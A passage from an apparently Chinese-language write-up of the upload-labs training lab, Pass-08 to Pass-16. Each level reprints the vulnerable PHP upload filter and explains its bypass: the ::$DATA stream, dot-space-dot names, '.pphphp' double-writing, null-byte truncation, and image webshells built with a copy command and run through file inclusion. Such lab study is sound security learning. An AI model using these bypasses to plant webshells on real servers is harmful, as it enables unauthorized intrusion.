class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，相比于前一关，少了去除文件名<code>::$DATA</code>，这里利用了windows的一个特性</p>
<p>NTFS文件系统包括对备用数据流的支持，在Windows中，此默认数据流称为<code>::$DATA</code>。</p>
<p>简单讲就是在php+windows的情况下：如果文件名加上<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code>之前的文件名。</p>
<p><strong>绕过方法：</strong></p>
<p>直接上传<code>1.php::$DATA</code>即可。</p>
<h4 id="Pass-09-点-空格-点绕过"><a href="#Pass-09-点-空格-点绕过" class="headerlink" title="Pass-09(点+空格+点绕过)"></a><strong>Pass-09(点+空格+点绕过)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的代码安全性高，黑名单，大小写，去点去空格。去<code>::$DATA</code>。</p>
<p>但是这里有逻辑漏洞，是先去点，再首尾去空，都只进行一次。所以这里可以构造点空格绕过，也是利用了Windows的特性。也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。</p>
<p><strong>绕过方法：</strong></p>
<p>上传后缀名尾<code>1.php. .</code>即可。</p>
<h4 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10(双写绕过)"></a><strong>Pass-10(双写绕过)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里代码没有了之前关卡里的去除文件尾点、空格、<code>::$DATA</code>的操作，估计是针对非Windows系统的。这里是利用了<code>str_ireplace</code>对黑名单里的文件后缀名进行了替换，换成空字符。</p>
<p><strong>绕过方法：</strong></p>
<p>用burp修改后缀名为 <code>.pphphp</code></p>
<h4 id="Pass-11-00截断get"><a href="#Pass-11-00截断get" class="headerlink" title="Pass-11(00截断get)"></a><strong>Pass-11(00截断get)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里与之前代码相比，使用了白名单，只允许上传<code>jpg</code>，<code>png</code>，<code>gif</code>三种格式文件。</p>
<p>但是在进行<code>move_uploaded_file</code>前。利用<code>$_GET[&#39;save_path&#39;]</code>和随机时间函数进行拼接，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。</p>
<p>利用的是00截断。即<code>move_uploaded_file</code>函数的底层实现类似于C语言，遇到0x00会截断。</p>
<p><strong>截断条件：</strong></p>
<ul>
<li>php版本小于5.3.4</li>
<li>php.ini的<code>magic_quotes_gpc</code>为OFF状态</li>
</ul>
<p><strong>绕过方法：</strong></p>
<img src="http://img.kawhi.xyz/image-20200503111752571.png" style="high:70%;width:70%;" />

<h4 id="Pass-12-00截断post"><a href="#Pass-12-00截断post" class="headerlink" title="Pass-12(00截断post)"></a><strong>Pass-12(00截断post)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里同样是白名单。</p>
<p>和十一关不同的是这次的<code>save_path</code>是通过<code>post</code>传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为<code>post</code>不会像<code>get</code>对<code>%00</code>进行自动解码。</p>
<p><strong>绕过方法：</strong></p>
<img src="http://img.kawhi.xyz/image-20200503113855012.png" style="high:70%;width:70%;" />

<h4 id="Pass-13-图片马"><a href="#Pass-13-图片马" class="headerlink" title="Pass-13(图片马)"></a><strong>Pass-13(图片马)</strong></h4><p>源码是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); //只读<span class="number">2</span>字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        case <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        case <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目描述为：</p>
<img src="http://img.kawhi.xyz/image-20200503161224229.png" style="high:70%;width:70%;" />

<p>从上面的代码可以看出来，将上传的文件读取先读取两字节，通过对比文件头来确认文件类型。于是就可以制作图片马，将php语句隐藏在图片中，然后结合文件包含漏洞执行php。</p>
<p><strong>绕过方法：</strong></p>
<p>在cmd命令下输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">copy <span class="number">1.</span>png /b + <span class="number">1.</span>php /a <span class="number">1.j</span>pg</span><br></pre></td></tr></table></figure>

<p>生成图片马后上传。</p>
<p>然后打开文件包含漏洞页面。这里的原理是<code>include</code>函数会试图解析读取的内容，是否为php代码，如若是则执行，否则直接输出。</p>
<img src="http://img.kawhi.xyz/image-20200503161934822.png" style="high:90%;width:90%;" />

<p>当然页面是只能看到图片的代码，php代码是看不到的。</p>
<p>用蚁剑测试一下，成功连接上</p>
<img src="http://img.kawhi.xyz/image-20200503162147838.png" style="high:90%;width:90%;" />

<h4 id="Pass-14-getimagesize图片马"><a href="#Pass-14-getimagesize图片马" class="headerlink" title="Pass-14(getimagesize图片马)"></a><strong>Pass-14(getimagesize图片马)</strong></h4><p>源码为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到使用了一个<code>getimagesize()</code>函数获取文件的类型，然后让<code>image_type_to_extension</code>函数返回文件的后缀再进行比较。</p>
<p><strong>绕过方法：</strong></p>
<p>和13关一样。</p>
<h4 id="Pass-15-exif-imagetype图片马"><a href="#Pass-15-exif-imagetype图片马" class="headerlink" title="Pass-15(exif_imagetype图片马)"></a><strong>Pass-15(exif_imagetype图片马)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    //需要开启php_exif模块</span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        default:</span><br><span class="line">            <span class="keyword">return</span> false;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是使用了<code>exif_imagetype</code>函数，这个函数的返回值有<code>IMAGETYPE_GIF</code>，<code>IMAGETYPE_JPEG</code>，<code>IMAGETYPE_PNG</code>等等。</p>
<p><strong>绕过方法：</strong></p>
<p>和13关一样。</p>
<h4 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16(二次渲染)"></a><strong>Pass-16(二次渲染)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == false)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == false)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == false)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line"><span class="meta">                @unlink($target_path);</span></span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 